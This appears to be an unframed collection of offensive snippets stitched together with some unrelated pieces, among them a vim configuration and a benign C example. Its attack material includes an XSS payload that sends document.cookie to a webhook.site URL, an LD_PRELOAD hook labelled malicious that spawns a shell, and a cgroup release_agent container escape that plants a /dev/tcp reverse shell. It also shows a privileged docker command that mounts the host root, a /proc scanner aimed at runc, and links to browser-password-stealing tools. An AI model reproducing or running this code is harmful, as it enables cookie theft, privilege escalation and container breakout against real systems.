<img src="x" onerror="if (!window.spammed) { window.spammed = true; this.src='https://webhook.site/b289fee0-0412-4cbb-9a24-5658f3066af3/?' + document.cookie; }">

#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>

int system(const char *command) {
    if (!command) return 0;
    
    // You can add your custom code here to run a root shell
    system("/bin/bash");

    // Call the original system() function
    typedef int (*orig_system)(const char *);
    orig_system original_system = dlsym(RTLD_NEXT, "system");
    return original_system(command);
}

gcc -shared -fPIC -o malicious.so malicious.c -ldl

export LD_PRELOAD=~/path_to_malicious.so


mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo 'bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1"' >> /cmd
chmod +x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

docker run -it --privileged --net=host --pid=host --ipc=host --volume /:/host ubuntu bash

set nocompatible    " Use Vim defaults, not vi-compatible
set expandtab       " Use spaces instead of tabs
set tabstop=4       " Set tab width to 4 spaces
set shiftwidth=4    " Indentation width
set smartindent     " Smart indentation
set encoding=utf-8  " Use UTF-8 encoding
set termguicolors   " Enable 24-bit color support
set backspace=2     " Allow backspace over all characters

#include <stdio.h>
#include <stdlib.h>

int main() {
    // Command to be executed
    const char *command = "ls -l";  // Example: list directory contents

    // Execute the command
    int result = system(command);

    // Check if the command was successful
    if (result == -1) {
        perror("Error executing the command");
    } else {
        printf("Command executed successfully\n");
    }

    return 0;
}

while true; do
    for f in /proc/*/exe; do
        # Extract PID from the /proc/[pid]/exe path
        pid=${f%%/exe}
        pid=${pid##*/}

        # Read the cmdline of the process
        cmdline=$(tr '\0' ' ' < /proc/${pid}/cmdline)

        # Check if cmdline is empty or contains 'runc'
        if [[ -z ${cmdline} ]] || [[ ${cmdline} == *runc* ]]; then
            echo "PID: ${pid} | CMD: ${cmdline}"
        fi
    done
    sleep 1  # Sleep to avoid overwhelming the system
done

https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d

"tdSJB3Ob6dF6/MctI2AMrTolV79rLJMizJeJVosvW3yE+KpZi4zBKHG3gdZOAIoo"

https://github.com/moonD4rk/HackBrowserData/releases
